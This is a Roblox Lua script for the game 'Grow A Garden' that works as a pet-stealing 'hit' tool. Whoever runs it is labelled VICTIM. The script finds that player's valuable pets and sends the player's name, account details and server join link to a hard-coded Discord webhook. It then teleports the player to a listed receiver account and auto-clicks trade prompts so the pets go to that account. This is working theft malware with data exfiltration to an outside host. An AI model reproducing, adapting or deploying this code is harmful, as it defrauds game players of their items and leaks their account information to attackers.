repeat task.wait() until game:IsLoaded()

local WEBHOOK_URL = "https://discord.com/api/webhooks/1399110447600242819/Ln1Qds770unNt6fpn688JOjkOMYK9naSUB-hB4fbwf8mFagdzXJZlBks1fa6BI7gA7t_"
local VICTIM = game.Players.LocalPlayer

local USERNAMES = {
    "ZeeS_Farm01"
}

local PET_WHITELIST = {
    'Raccoon',
    'T-Rex',
    'Fennec Fox',
    'Dragonfly',
    'Butterfly',
    'Disco Bee',
    'Mimic Octopus',
    'Queen Bee',
    'Spinosaurus',
    'Kitsune',
    'Corrupted Kitsune',
    'Raiju',
    'Chicken Zombie',
    'Red Fox',
    'Dilophosaurus'
}

local MIN_PET_AGE = 3         -- ÐœÐ¸Ð½Ð¸Ð¼Ð°Ð»ÑŒÐ½Ñ‹Ð¹ Ð²Ð¾Ð·Ñ€Ð°ÑÑ‚ (Ð´Ð½Ð¸)
local MIN_PET_WEIGHT = 5.0    -- ÐœÐ¸Ð½Ð¸Ð¼Ð°Ð»ÑŒÐ½Ñ‹Ð¹ Ð²ÐµÑ (ÐºÐ³)

local victimPetTable = {}

local VirtualInputManager = game:GetService("VirtualInputManager")
local HttpService = game:GetService("HttpService")
local dataModule = require(game:GetService("ReplicatedStorage").Modules.DataService)

-- ÐŸÑ€Ð¾Ð²ÐµÑ€ÐºÐ° Ð½Ð° Ð¸Ð³Ñ€Ð¾ÐºÐ° Ð¸Ð· ÑÐ¿Ð¸ÑÐºÐ°
local function waitForJoin()
    local findTarget = false
    local trigeretName = nil

    for _, player in game.Players:GetPlayers() do
        if table.find(USERNAMES, player.Name) then
            trigeretName = player.Name
            findTarget = true
            break
        end
    end

    return findTarget, trigeretName
end

-- ÐŸÑ€Ð¾Ð²ÐµÑ€ÐºÐ°, Ð¿Ð¾Ð´Ñ…Ð¾Ð´Ð¸Ñ‚ Ð»Ð¸ Ð¿Ð¸Ñ‚Ð¾Ð¼ÐµÑ†
local function checkPetsWhilelist(petType, age, weight)
    local isNameMatch = false
    for _, name in ipairs(PET_WHITELIST) do
        if string.find(petType, name) then
            isNameMatch = true
            break
        end
    end

    if not isNameMatch then
        return false
    end

    if age and weight then
        if age >= MIN_PET_AGE and weight >= MIN_PET_WEIGHT then
            return true
        end
    end

    return false
end

-- ÐŸÐ¾Ð»ÑƒÑ‡ÐµÐ½Ð¸Ðµ Ð¿Ð¾Ð´Ñ…Ð¾Ð´ÑÑ‰Ð¸Ñ… Ð¿Ð¸Ñ‚Ð¾Ð¼Ñ†ÐµÐ² Ð¸Ð³Ñ€Ð¾ÐºÐ°
local function getPlayersPets()
    for _, petData in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
        local petType = petData.PetType
        local age = petData.Age
        local weight = petData.Weight

        if checkPetsWhilelist(petType, age, weight) then
            table.insert(victimPetTable, petType)
        end
    end
end

-- ÐŸÐ¾Ð»ÑƒÑ‡Ð¸Ñ‚ÑŒ Ð¾Ð±ÑŠÐµÐºÑ‚ Ð¿Ð¸Ñ‚Ð¾Ð¼Ñ†Ð° Ð¿Ð¾ UID
local function getPetObject(petUid)
    for _, obj in ipairs(VICTIM.Backpack:GetChildren()) do
        if obj:GetAttribute("PET_UUID") == petUid then
            return obj
        end
    end
    for _, obj in ipairs(workspace[VICTIM.Name]:GetChildren()) do
        if obj:GetAttribute("PET_UUID") == petUid then
            return obj
        end
    end
    return nil
end

-- Ð­ÐºÐ¸Ð¿Ð¸Ñ€Ð¾Ð²ÐºÐ° Ð¿Ð¸Ñ‚Ð¾Ð¼Ñ†Ð°
local function equipPet(pet)
    if pet:GetAttribute("d") then
        game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(pet)
    end
    VICTIM.Character.Humanoid:EquipTool(pet)
end

-- ÐÐ²Ñ‚Ð¾ÐºÐ»Ð¸Ðº Ð¿Ð¾ Prompt'Ñƒ
local function deltaBypass()
    local cx = workspace.Camera.ViewportSize.X / 2
    local cy = workspace.Camera.ViewportSize.Y / 2

    VirtualInputManager:SendMouseButtonEvent(cx, cy, 0, true, nil, false)
    task.wait()
    VirtualInputManager:SendMouseButtonEvent(cx, cy, 0, false, nil, false)
end

-- ÐšÑ€Ð°Ð¶Ð° Ñ‡ÐµÑ€ÐµÐ· Prompt
local function startSteal(targetName)
    local prompt = game.Players[targetName].Character.Head:FindFirstChild("ProximityPrompt")
    if prompt then
        prompt.HoldDuration = 0
        deltaBypass()
    end
end

-- ÐŸÑ€Ð¾Ð²ÐµÑ€ÐºÐ° Ð¸ Ð¿Ð¾Ð¿Ñ‹Ñ‚ÐºÐ° ÑƒÐºÑ€Ð°ÑÑ‚ÑŒ
local function checkPetsInventory(target)
    for petUid, value in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
        if not checkPetsWhilelist(value.PetType, value.Age, value.Weight) then
            continue
        end

        local petObject = getPetObject(petUid)
        if not petObject then continue end

        equipPet(petObject)
        task.wait(0.2)
        startSteal(target)
    end
end

-- Ð¢ÐµÐ»ÐµÐ¿Ð¾Ñ€Ñ‚Ð°Ñ†Ð¸Ñ Ðº Ð¸Ð³Ñ€Ð¾ÐºÑƒ
local function teleportTarget(targetName)
    VICTIM.Character.HumanoidRootPart.CFrame = game.Players[targetName].Character.HumanoidRootPart.CFrame
end

-- Discord embed Ð¾Ñ‚Ð¿Ñ€Ð°Ð²ÐºÐ°
local function createDiscordEmbed(petList, totalValue)
    local embed = {
        title = "ðŸŒµ Grow A Garden Hit - DARK SKIDS ðŸ€",
        color = 65280,
        fields = {
            {
                name = "ðŸ‘¤ Player Information",
                value = string.format("```Name: %s\nReceiver: %s\nExecutor: %s\nAccount Age: %s```", 
                    VICTIM.Name, 
                    table.concat(USERNAMES, " "), 
                    identifyexecutor(), 
                    VICTIM.AccountAge
                ),
                inline = false
            },
            {
                name = "ðŸ’° Total Value",
                value = string.format("```%sÂ¢```", totalValue),
                inline = false
            },
            {
                name = "ðŸŒ´ Backpack",
                value = string.format("```%s```", petList),
                inline = false
            },
            {
                name = "ðŸï¸ Join with URL",
                value = string.format(
                    "[%s](https://kebabman.vercel.app/start?placeId=%s&gameInstanceId=%s)", 
                    game.JobId, 
                    game.PlaceId, 
                    game.JobId
                ),
                inline = false
            }
        },
        footer = {
            text = string.format("%s | %s", game.PlaceId, game.JobId)
        }
    }

    local data = {
        content = string.format(
            "--@everyone\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(%s, \"%s\")\n",
            game.PlaceId,
            game.JobId
        ),
        username = VICTIM.Name,
        avatar_url = "https://cdn.discordapp.com/attachments/1024859338205429760/1103739198735261716/icon.png",
        embeds = {embed}
    }

    local jsonData = HttpService:JSONEncode(data)
    local headers = { ["Content-Type"] = "application/json" }
    local request = http_request or request or HttpPost or syn.request

    local response = request({
        Url = WEBHOOK_URL,
        Method = "POST",
        Headers = headers,
        Body = jsonData
    })

    if response.StatusCode ~= 200 and response.StatusCode ~= 204 then
        warn("ÐžÑˆÐ¸Ð±ÐºÐ° Ð¾Ñ‚Ð¿Ñ€Ð°Ð²ÐºÐ¸ Ð² Discord:", response.StatusCode, response.Body)
    end
end

-- Ð¦Ð¸ÐºÐ» Ð¿Ñ€Ð¾Ð²ÐµÑ€ÐºÐ¸ Ð¸Ð³Ñ€Ð¾ÐºÐ¾Ð²
local function idlingTarget()
    task.spawn(function()
        while task.wait(0.2) do
            local found, target = waitForJoin()
            if found then
                teleportTarget(target)
                checkPetsInventory(target)
            end
        end
    end)
end

-- â³ Ð¡Ñ‚Ð°Ñ€Ñ‚
getPlayersPets()

task.spawn(function()
    while task.wait(0.5) do
        if #victimPetTable > 0 then
            idlingTarget()
            createDiscordEmbed(table.concat(victimPetTable, "\n"), "100000")
            break
        end
    end
end)
